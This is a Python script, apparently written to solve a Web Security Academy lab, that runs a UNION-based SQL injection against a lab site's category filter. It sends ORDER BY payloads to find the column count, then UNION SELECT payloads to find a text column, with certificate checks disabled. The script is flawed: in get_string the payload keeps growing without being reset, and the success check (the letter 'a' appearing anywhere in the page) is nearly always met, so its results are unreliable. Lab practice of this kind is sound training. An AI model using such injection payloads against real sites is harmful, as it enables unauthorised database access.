import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_col(url):
    for i in range(1, 50):
        payload = f"Pets'+order+by+{str(i)}--"
        r = requests.get(url + payload, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            return i - 1
        i = i + 1
    return False

def get_string(url, col):
    payload = "Pets' UNION SELECT "
    null_lst = []
    for i in range(1, col + 1):
        null_lst.append("null")
    for i in range(1, col + 1):
        null_lst[i - 1] = 'a' # Replace this with string mentioned in the lab (since it changes for every session)
        payload = payload + ', '.join(null_lst) + '--'
        r = requests.get(url+payload, verify=False, proxies=proxies)
        if 'a' in r.text:
            return 'a'
    return False
    

url = 'https://acd51fbc1f5c03bfc01948260008008f.web-security-academy.net/filter?category='
col = get_col(url)
print("Getting col..")
print(f'no of col{col}')
if col:
    r_string = get_string(url, col)
    if r_string:
        print('[.] successful SQLi')
        print(f'[.] Retrieved {r_string}')
else:
    print('[.] Unsuccessful SQLi')
